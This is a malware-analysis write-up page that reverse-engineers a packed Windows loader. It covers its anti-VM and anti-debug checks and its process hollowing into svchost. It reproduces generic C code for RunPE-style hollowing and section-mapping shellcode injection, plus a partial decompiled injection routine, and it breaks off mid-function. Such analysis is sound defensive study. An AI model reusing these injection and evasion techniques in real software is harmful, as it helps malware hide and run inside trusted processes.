<!DOCTYPE html>
<html class="writer-html5" lang="en" >
<head>
  <meta charset="utf-8" /><meta name="generator" content="Docutils 0.18.1: http://docutils.sourceforge.net/" />

  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Sample 2 &mdash; abdelrahman walkthrough 1 documentation</title>
      <link rel="stylesheet" href="../_static/pygments.css" type="text/css" />
      <link rel="stylesheet" href="../_static/css/theme.css" type="text/css" />
      <link rel="stylesheet" href="../_static/custom.css" type="text/css" />
      <link rel="stylesheet" href="../_static/fonts.css" type="text/css" />
  <!--[if lt IE 9]>
    <script src="../_static/js/html5shiv.min.js"></script>
  <![endif]-->
  
        <script src="../_static/jquery.js?v=5d32c60e"></script>
        <script src="../_static/_sphinx_javascript_frameworks_compat.js?v=2cd50e6c"></script>
        <script src="../_static/documentation_options.js?v=29a6c3e3"></script>
        <script src="../_static/doctools.js?v=888ff710"></script>
        <script src="../_static/sphinx_highlight.js?v=dc90522c"></script>
    <script src="../_static/js/theme.js"></script>
    <link rel="index" title="Index" href="../genindex.html" />
    <link rel="search" title="Search" href="../search.html" />
    <link rel="prev" title="Agent tesla (sample1)" href="../confus/agentsmtp.html" /> 
</head>

<body class="wy-body-for-nav"> 
  <div class="wy-grid-for-nav">
    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
      <div class="wy-side-scroll">
        <div class="wy-side-nav-search" >

          
          
          <a href="../index.html" class="icon icon-home">
            abdelrahman walkthrough
          </a>
<div role="search">
  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
    <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" />
    <input type="hidden" name="check_keywords" value="yes" />
    <input type="hidden" name="area" value="default" />
  </form>
</div>
        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
              <ul class="current">
<li class="toctree-l1"><a class="reference internal" href="../lab1/lab1.html">Practical Malware Analysis - Lab 1</a></li>
<li class="toctree-l1"><a class="reference internal" href="../lab3/lab3.html">Practical Malware Analysis - Lab 3</a></li>
<li class="toctree-l1"><a class="reference internal" href="../lab5/lab5.html">Practical Malware Analysis - Lab 5</a></li>
<li class="toctree-l1"><a class="reference internal" href="../lab6/lab6.html">Practical Malware Analysis - Lab 6</a></li>
<li class="toctree-l1"><a class="reference internal" href="../lab7/lab7.html">Practical Malware Analysis - Lab 7</a></li>
<li class="toctree-l1"><a class="reference internal" href="../lab9/lab9.html">Practical Malware Analysis - Lab 9</a></li>
<li class="toctree-l1"><a class="reference internal" href="../lab10/lab10.html">Practical Malware Analysis - Lab 10</a></li>
<li class="toctree-l1"><a class="reference internal" href="../lab11/lab11.html">Practical Malware Analysis - Lab 11</a></li>
<li class="toctree-l1"><a class="reference internal" href="../lab12/lab12.html">Practical Malware Analysis - Lab 12</a></li>
<li class="toctree-l1"><a class="reference internal" href="../lab13/lab13.html">Practical Malware Analysis - Lab 13</a></li>
<li class="toctree-l1"><a class="reference internal" href="../lab14/lab14.html">Practical Malware Analysis - Lab 14</a></li>
<li class="toctree-l1"><a class="reference internal" href="../lab15/lab15.html">Practical Malware Analysis - Lab 15</a></li>
<li class="toctree-l1"><a class="reference internal" href="../lab16/lab16.html">Practical Malware Analysis - Lab 16</a></li>
<li class="toctree-l1"><a class="reference internal" href="../lab17/lab17.html">Practical Malware Analysis - Lab 17</a></li>
<li class="toctree-l1"><a class="reference internal" href="../lab18/lab18.html">Practical Malware Analysis - Lab 18</a></li>
<li class="toctree-l1"><a class="reference internal" href="../lab19/lab19.html">Practical Malware Analysis - Lab 19</a></li>
<li class="toctree-l1"><a class="reference internal" href="../mal1/mal1.html">Princess Locker</a></li>
<li class="toctree-l1"><a class="reference internal" href="../mal2/mal2.html">Blackcat Ransomware</a></li>
<li class="toctree-l1"><a class="reference internal" href="../mal3/mal3.html">Agent tesla</a></li>
<li class="toctree-l1"><a class="reference internal" href="../SignedUrl/text.html">SignedUrl Hub</a></li>
<li class="toctree-l1"><a class="reference internal" href="../mal4/mal4.html">Vidar</a></li>
<li class="toctree-l1"><a class="reference internal" href="../laugh/chals.html">0xLaugh Rev Challenges</a></li>
<li class="toctree-l1"><a class="reference internal" href="../mal5/agenttesla.html">Agent Tesla Malware Analysis</a></li>
<li class="toctree-l1"><a class="reference internal" href="../mal6/remcos.html">Remcos Malware Analysis</a></li>
<li class="toctree-l1"><a class="reference internal" href="../confus/agentsmtp.html">Agent tesla (sample1)</a></li>
<li class="toctree-l1 current"><a class="current reference internal" href="#">Sample 2</a></li>
<li class="toctree-l1"><a class="reference internal" href="#deep-analysis">Deep analysis</a></li>
</ul>

        </div>
      </div>
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="Mobile navigation menu" >
          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
          <a href="../index.html">abdelrahman walkthrough</a>
      </nav>

      <div class="wy-nav-content">
        <div class="rst-content style-external-links">
          <div role="navigation" aria-label="Page navigation">
  <ul class="wy-breadcrumbs">
      <li><a href="../index.html" class="icon icon-home" aria-label="Home"></a></li>
      <li class="breadcrumb-item active">Sample 2</li>
      <li class="wy-breadcrumbs-aside">
            <a href="../_sources/mal8/sample2.rst.txt" rel="nofollow"> View page source</a>
      </li>
  </ul>
  <hr/>
</div>
          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
           <div itemprop="articleBody">
             
  <section id="sample-2">
<h1>Sample 2<a class="headerlink" href="#sample-2" title="Link to this heading"></a></h1>
</section>
<section id="deep-analysis">
<h1>Deep analysis<a class="headerlink" href="#deep-analysis" title="Link to this heading"></a></h1>
<div class="line-block">
<div class="line">The sample is a 32bit, opening it in ida we notice it is using api hashing and peb walking</div>
<div class="line">Cleaning the sample with hashdb plugin and fixing variable types to correctly display the peb walking and renaming some functions</div>
</div>
<p>First it gets the kernel32 base address from the peb and then resolves LdrGetDllHandle</p>
<img alt="../_images/Screenshot_129.png" src="../_images/Screenshot_129.png" />
<p>Then it resolves some additional functions from the kernel32 dll handle and storing it into v31</p>
<img alt="../_images/Screenshot_228.png" src="../_images/Screenshot_228.png" />
<img alt="../_images/Screenshot_328.png" src="../_images/Screenshot_328.png" />
<p>using hashdb we get the functions</p>
<img alt="../_images/Screenshot_426.png" src="../_images/Screenshot_426.png" />
<p>then it calls some function with <code class="docutils literal notranslate"><span class="pre">lol</span></code></p>
<img alt="../_images/Screenshot_520.png" src="../_images/Screenshot_520.png" />
<p>turns out it was openmutex call, so the mutex name is <code class="docutils literal notranslate"><span class="pre">lol</span></code></p>
<img alt="../_images/Screenshot_619.png" src="../_images/Screenshot_619.png" />
<p>then checks last error from teb equals two (likely ERROR_FILE_NOT_FOUND error code), seems like if mutex opened successful</p>
<img alt="../_images/Screenshot_713.png" src="../_images/Screenshot_713.png" />
<p>passing the check, then it iterates over the process searching for any vm processes</p>
<img alt="../_images/Screenshot_99.png" src="../_images/Screenshot_99.png" />
<img alt="../_images/Screenshot_1010.png" src="../_images/Screenshot_1010.png" />
<p>passing the check, we arrive at another check for sandboxie dll it tries to gethandle of that dll if succeed we go to that rabbit hole function</p>
<img alt="../_images/Screenshot_1111.png" src="../_images/Screenshot_1111.png" />
<img alt="../_images/Screenshot_1210.png" src="../_images/Screenshot_1210.png" />
<p>Then another check for checking registry keys at system\currentcontrolset\services\disk\enum which contains the name and serial ID of disk (antiVM)</p>
<img alt="../_images/Screenshot_138.png" src="../_images/Screenshot_138.png" />
<img alt="../_images/Screenshot_147.png" src="../_images/Screenshot_147.png" />
<img alt="../_images/Screenshot_158.png" src="../_images/Screenshot_158.png" />
<p>Then does a check to check time elapsed between instruction (antidebugging but does nothing with it nopped)</p>
<img alt="../_images/Screenshot_168.png" src="../_images/Screenshot_168.png" />
<p>We arrive at last bit of code which seems like our main functions</p>
<img alt="../_images/Screenshot_177.png" src="../_images/Screenshot_177.png" />
<p>it takes in a huge blob likely a packed code</p>
<img alt="../_images/Screenshot_187.png" src="../_images/Screenshot_187.png" />
<p>and prepares another variable containing another encoded code</p>
<img alt="../_images/Screenshot_197.png" src="../_images/Screenshot_197.png" />
<div class="line-block">
<div class="line">Inside the function, it peb walks again and prepares virtual allocate and terminateprocess</div>
<div class="line">and puts the encoded data as size in the virtual allocate with base address same as v22</div>
</div>
<div class="highlight-c++ notranslate"><div class="highlight"><pre><span></span><span class="n">NTSYSAPI</span><span class="w"> </span><span class="n">NTSTATUS</span><span class="w"> </span><span class="n">ZwAllocateVirtualMemory</span><span class="p">(</span>
<span class="p">[</span><span class="n">in</span><span class="p">]</span><span class="w">      </span><span class="n">HANDLE</span><span class="w">    </span><span class="n">ProcessHandle</span><span class="p">,</span>
<span class="p">[</span><span class="n">in</span><span class="p">,</span><span class="w"> </span><span class="n">out</span><span class="p">]</span><span class="w"> </span><span class="n">PVOID</span><span class="w">     </span><span class="o">*</span><span class="n">BaseAddress</span><span class="p">,</span>
<span class="p">[</span><span class="n">in</span><span class="p">]</span><span class="w">      </span><span class="n">ULONG_PTR</span><span class="w"> </span><span class="n">ZeroBits</span><span class="p">,</span>
<span class="p">[</span><span class="n">in</span><span class="p">,</span><span class="w"> </span><span class="n">out</span><span class="p">]</span><span class="w"> </span><span class="n">PSIZE_T</span><span class="w">   </span><span class="n">RegionSize</span><span class="p">,</span>
<span class="p">[</span><span class="n">in</span><span class="p">]</span><span class="w">      </span><span class="n">ULONG</span><span class="w">     </span><span class="n">AllocationType</span><span class="p">,</span>
<span class="p">[</span><span class="n">in</span><span class="p">]</span><span class="w">      </span><span class="n">ULONG</span><span class="w">     </span><span class="n">Protect</span>
<span class="p">)</span>
</pre></div>
</div>
<img alt="../_images/Screenshot_206.png" src="../_images/Screenshot_206.png" />
<img alt="../_images/Screenshot_2112.png" src="../_images/Screenshot_2112.png" />
<p>Then while debugging running over this function, exits the exe and executes malicious behaviour</p>
<img alt="../_images/Screenshot_229.png" src="../_images/Screenshot_229.png" />
<p>Maybe because it starts with modifying the ret address</p>
<img alt="../_images/Screenshot_236.png" src="../_images/Screenshot_236.png" />
<p>Setting some breakpoints, noticed it is writing something , some decoded data</p>
<img alt="../_images/Screenshot_247.png" src="../_images/Screenshot_247.png" />
<p>decoded more data, likely this is the process it will inject svchost</p>
<img alt="../_images/Screenshot_256.png" src="../_images/Screenshot_256.png" />
<p>it is just writing some gibberish now so i will break on that interesting call</p>
<img alt="../_images/Screenshot_266.png" src="../_images/Screenshot_266.png" />
<img alt="../_images/Screenshot_276.png" src="../_images/Screenshot_276.png" />
<p>it hit that breakpoint, and we see new data written , libraries used for process injection</p>
<img alt="../_images/Screenshot_285.png" src="../_images/Screenshot_285.png" />
<p>Now we got out of the function lets skip this processing till we get this last bit</p>
<img alt="../_images/Screenshot_296.png" src="../_images/Screenshot_296.png" />
<img alt="../_images/Screenshot_306.png" src="../_images/Screenshot_306.png" />
<p>This line sounds interesting, running till that instruction, and letting all deobfuscation write to that function that is called</p>
<img alt="../_images/Screenshot_3111.png" src="../_images/Screenshot_3111.png" />
<p>Then we see the decoded routine, where the process injection happens</p>
<img alt="../_images/Screenshot_329.png" src="../_images/Screenshot_329.png" />
<p>Going till the virtualalloc and grabbing the allocated address in the dump</p>
<img alt="../_images/Screenshot_337.png" src="../_images/Screenshot_337.png" />
<p>basically what is happening is similar to this code</p>
<div class="highlight-c++ notranslate"><div class="highlight"><pre><span></span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">CreateProcessA</span><span class="p">(</span><span class="n">szFileName</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">FALSE</span><span class="p">,</span><span class="w"> </span><span class="n">CREATE_SUSPENDED</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">si</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">pi</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">FALSE</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">Debug</span><span class="p">(</span><span class="s">&quot;[Debug] RunPE(): CreateProcessA(): (%lu)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">GetLastError</span><span class="p">());</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">FALSE</span><span class="p">;</span>
<span class="p">}</span>

<span class="cm">/* Get thread context (processor-specific register data) */</span>
<span class="n">context</span><span class="p">.</span><span class="n">ContextFlags</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CONTEXT_FULL</span><span class="p">;</span>
<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">GetThreadContext</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hThread</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">context</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">FALSE</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">Debug</span><span class="p">(</span><span class="s">&quot;[Debug] RunPE(): GetThreadContext()&quot;</span><span class="p">);</span>
<span class="p">}</span>

<span class="cm">/* Unmap memory space of program */</span>
<span class="n">pZwUnmapViewOfSection</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">PZUVOS</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandleA</span><span class="p">(</span><span class="s">&quot;ntdll.dll&quot;</span><span class="p">),</span><span class="w"> </span><span class="s">&quot;ZwUnmapViewOfSection&quot;</span><span class="p">);</span>
<span class="n">pZwUnmapViewOfSection</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">PVOID</span><span class="p">)</span><span class="n">pinh</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">ImageBase</span><span class="p">);</span>

<span class="cm">/* Allocate virtual memory for program */</span>
<span class="n">lpAddress</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">VirtualAllocEx</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">PVOID</span><span class="p">)</span><span class="n">pinh</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">ImageBase</span><span class="p">,</span><span class="w"> </span><span class="n">pinh</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">SizeOfImage</span><span class="p">,</span><span class="w"> </span><span class="n">MEM_COMMIT</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">MEM_RESERVE</span><span class="p">,</span><span class="w"> </span><span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">lpAddress</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nb">NULL</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">Debug</span><span class="p">(</span><span class="s">&quot;[Debug] RunPE(): VirtualAllocEx(): (%lu)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">GetLastError</span><span class="p">());</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">FALSE</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>
<p>And this code also, notice memcpy part i will break at all memcpy to dump the packed malware
memcpy in assembly is rep movsb</p>
<img alt="../_images/Screenshot_427.png" src="../_images/Screenshot_427.png" />
<div class="highlight-c++ notranslate"><div class="highlight"><pre><span></span><span class="c1">// create a memory section</span>
<span class="w">    </span><span class="n">fNtCreateSection</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sectionHandle</span><span class="p">,</span><span class="w"> </span><span class="n">SECTION_MAP_READ</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">SECTION_MAP_WRITE</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">SECTION_MAP_EXECUTE</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">PLARGE_INTEGER</span><span class="p">)</span><span class="o">&amp;</span><span class="n">sectionSize</span><span class="p">,</span><span class="w"> </span><span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">,</span><span class="w"> </span><span class="n">SEC_COMMIT</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span>

<span class="w">    </span><span class="c1">// create a view of the memory section in the local process</span>
<span class="w">    </span><span class="n">fNtMapViewOfSection</span><span class="p">(</span><span class="n">sectionHandle</span><span class="p">,</span><span class="w"> </span><span class="n">GetCurrentProcess</span><span class="p">(),</span><span class="w"> </span><span class="o">&amp;</span><span class="n">localSectionAddress</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">size</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">PAGE_READWRITE</span><span class="p">);</span>

<span class="w">    </span><span class="c1">// create a view of the memory section in the target process</span>
<span class="w">    </span><span class="n">HANDLE</span><span class="w"> </span><span class="n">targetHandle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">OpenProcess</span><span class="p">(</span><span class="n">PROCESS_ALL_ACCESS</span><span class="p">,</span><span class="w"> </span><span class="nb">false</span><span class="p">,</span><span class="w"> </span><span class="mi">1480</span><span class="p">);</span>
<span class="w">    </span><span class="n">fNtMapViewOfSection</span><span class="p">(</span><span class="n">sectionHandle</span><span class="p">,</span><span class="w"> </span><span class="n">targetHandle</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">remoteSectionAddress</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">size</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">PAGE_EXECUTE_READ</span><span class="p">);</span>

<span class="w">    </span><span class="c1">// copy shellcode to the local view, which will get reflected in the target process&#39;s mapped view</span>
<span class="w">    </span><span class="n">memcpy</span><span class="p">(</span><span class="n">localSectionAddress</span><span class="p">,</span><span class="w"> </span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>

<span class="w">    </span><span class="n">HANDLE</span><span class="w"> </span><span class="n">targetThreadHandle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
</pre></div>
</div>
<p>And here it is deciding what to inject based on OS 32 or 64 bit ,i get svchost because iam on 64 bit OS.</p>
<img alt="../_images/Screenshot_347.png" src="../_images/Screenshot_347.png" />
<img alt="../_images/Screenshot_357.png" src="../_images/Screenshot_357.png" />
<p>Then the start of typical process injection, it creates a process with CREATE_SUSPENDED (at push 4)</p>
<img alt="../_images/Screenshot_367.png" src="../_images/Screenshot_367.png" />
<p>Our first hit with memcpy, is the malware is copying svchost after mapping it</p>
<img alt="../_images/Screenshot_406.png" src="../_images/Screenshot_406.png" />
<p>Our second hit, we see it is copying itself into the svchost</p>
<img alt="../_images/Screenshot_4111.png" src="../_images/Screenshot_4111.png" />
<p>Then it creates suspended process with the copied svchost</p>
<img alt="../_images/Screenshot_436.png" src="../_images/Screenshot_436.png" />
<p>Then writes our copied malware into mapped svchost</p>
<img alt="../_images/Screenshot_446.png" src="../_images/Screenshot_446.png" />
<p>I debugged the malware into ida then fixed function calls ,types and renaming to make analysis easier</p>
<div class="highlight-c++ notranslate"><div class="highlight"><pre><span></span><span class="kt">void</span><span class="w"> </span><span class="kr">__cdecl</span><span class="w"> </span><span class="n">__noreturn</span><span class="w"> </span><span class="nf">sub_300C0</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">a1</span><span class="p">)</span>
<span class="p">{</span>
<span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">v1</span><span class="p">;</span><span class="w"> </span><span class="c1">// edx</span>
<span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">v2</span><span class="p">;</span><span class="w"> </span><span class="c1">// edi</span>
<span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">v3</span><span class="p">;</span><span class="w"> </span><span class="c1">// esi</span>
<span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">v4</span><span class="p">;</span><span class="w"> </span><span class="c1">// [esp+0h] [ebp-354h] BYREF</span>
<span class="kt">int</span><span class="w"> </span><span class="n">v5</span><span class="p">;</span><span class="w"> </span><span class="c1">// [esp+B0h] [ebp-2A4h]</span>
<span class="k">struct</span><span class="w"> </span><span class="nc">_PROCESS_INFORMATION</span><span class="w"> </span><span class="n">ProcessInformation</span><span class="p">;</span><span class="w"> </span><span class="c1">// [esp+2CCh] [ebp-88h] BYREF</span>
<span class="k">struct</span><span class="w"> </span><span class="nc">_STARTUPINFOW</span><span class="w"> </span><span class="n">StartupInfo</span><span class="p">;</span><span class="w"> </span><span class="c1">// [esp+2DCh] [ebp-78h] BYREF</span>
<span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">svchostInMEM</span><span class="p">;</span><span class="w"> </span><span class="c1">// [esp+320h] [ebp-34h] BYREF</span>
<span class="kt">int</span><span class="w"> </span><span class="n">v9</span><span class="p">;</span><span class="w"> </span><span class="c1">// [esp+324h] [ebp-30h] BYREF</span>
<span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">v10</span><span class="p">;</span><span class="w"> </span><span class="c1">// [esp+328h] [ebp-2Ch] BYREF</span>
<span class="kt">int</span><span class="w"> </span><span class="n">v11</span><span class="p">;</span><span class="w"> </span><span class="c1">// [esp+32Ch] [ebp-28h] BYREF</span>
<span class="kt">int</span><span class="w"> </span><span class="n">v12</span><span class="p">;</span><span class="w"> </span><span class="c1">// [esp+330h] [ebp-24h]</span>
<span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">v13</span><span class="p">;</span><span class="w"> </span><span class="c1">// [esp+334h] [ebp-20h] BYREF</span>
<span class="kt">int</span><span class="w"> </span><span class="n">v14</span><span class="p">;</span><span class="w"> </span><span class="c1">// [esp+338h] [ebp-1Ch]</span>
<span class="n">_IMAGE_DOS_HEADER</span><span class="w"> </span><span class="o">*</span><span class="n">localSelectionAddress</span><span class="p">;</span><span class="w"> </span><span class="c1">// [esp+33Ch] [ebp-18h] BYREF</span>
<span class="kt">int</span><span class="w"> </span><span class="n">v16</span><span class="p">;</span><span class="w"> </span><span class="c1">// [esp+340h] [ebp-14h] BYREF</span>
<span class="n">HANDLE</span><span class="w"> </span><span class="n">v17</span><span class="p">;</span><span class="w"> </span><span class="c1">// [esp+344h] [ebp-10h]</span>
<span class="n">LPWSTR</span><span class="w"> </span><span class="n">lpFilename</span><span class="p">;</span><span class="w"> </span><span class="c1">// [esp+348h] [ebp-Ch]</span>
<span class="n">HMODULE</span><span class="w"> </span><span class="n">thisFile</span><span class="p">;</span><span class="w"> </span><span class="c1">// [esp+34Ch] [ebp-8h]</span>
<span class="kt">int</span><span class="w"> </span><span class="n">v20</span><span class="p">;</span><span class="w"> </span><span class="c1">// [esp+350h] [ebp-4h] BYREF</span>

<span class="n">thisFile</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">GetModuleHandleW</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="n">lpFilename</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mh">0x8000u</span><span class="p">,</span><span class="w"> </span><span class="mh">0x1000u</span><span class="p">,</span><span class="w"> </span><span class="mi">4u</span><span class="p">);</span>
<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="o">!</span><span class="n">lpFilename</span><span class="w"> </span><span class="p">)</span>
<span class="nl">LABEL_26</span><span class="p">:</span>
<span class="w">    </span><span class="n">ExitProcess</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="n">GetModuleFileNameW</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">lpFilename</span><span class="p">,</span><span class="w"> </span><span class="mh">0x8000u</span><span class="p">);</span>
<span class="n">SetEnvironmentVariableW</span><span class="p">(</span><span class="o">&amp;</span><span class="n">Name</span><span class="p">,</span><span class="w"> </span><span class="n">lpFilename</span><span class="p">);</span>
<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="o">!</span><span class="n">GetWindowsDirectoryW</span><span class="p">(</span><span class="n">lpFilename</span><span class="p">,</span><span class="w"> </span><span class="mh">0x8000u</span><span class="p">)</span>
<span class="w">    </span><span class="o">||</span><span class="w"> </span><span class="p">((</span><span class="n">v20</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">ZwQueryInformationProcess</span><span class="p">)(</span><span class="mi">-1</span><span class="p">,</span><span class="w"> </span><span class="mi">26</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">v20</span><span class="p">,</span><span class="w"> </span><span class="mi">4</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">),</span><span class="w"> </span><span class="n">v20</span><span class="p">)</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="n">lstrcatW</span><span class="p">(</span><span class="n">lpFilename</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">off_30094</span><span class="p">)</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="n">lstrcatW</span><span class="p">(</span><span class="n">lpFilename</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">String2</span><span class="p">),</span>
<span class="w">        </span><span class="n">v17</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CreateFileW</span><span class="p">(</span><span class="n">lpFilename</span><span class="p">,</span><span class="w"> </span><span class="n">GENERIC_READ</span><span class="p">,</span><span class="w"> </span><span class="mi">1u</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">OPEN_EXISTING</span><span class="p">,</span><span class="w"> </span><span class="mh">0x80u</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">),</span>
<span class="w">        </span><span class="n">v17</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">-1</span><span class="p">)</span><span class="w"> </span><span class="p">)</span>
<span class="p">{</span>
<span class="nl">LABEL_25</span><span class="p">:</span>
<span class="w">    </span><span class="n">VirtualFree</span><span class="p">(</span><span class="n">lpFilename</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mh">0x8000u</span><span class="p">);</span>
<span class="w">    </span><span class="k">goto</span><span class="w"> </span><span class="n">LABEL_26</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="p">(</span><span class="n">ZWCreateSection</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">v16</span><span class="p">,</span><span class="w"> </span><span class="mi">4</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="mh">0x1000000</span><span class="p">,</span><span class="w"> </span><span class="n">v17</span><span class="p">)</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="p">)</span>
<span class="p">{</span>
<span class="nl">LABEL_24</span><span class="p">:</span>
<span class="w">    </span><span class="n">CloseHandle</span><span class="p">(</span><span class="n">v17</span><span class="p">);</span>
<span class="w">    </span><span class="k">goto</span><span class="w"> </span><span class="n">LABEL_25</span><span class="p">;</span>
<span class="p">}</span>
<span class="n">localSelectionAddress</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="n">v13</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
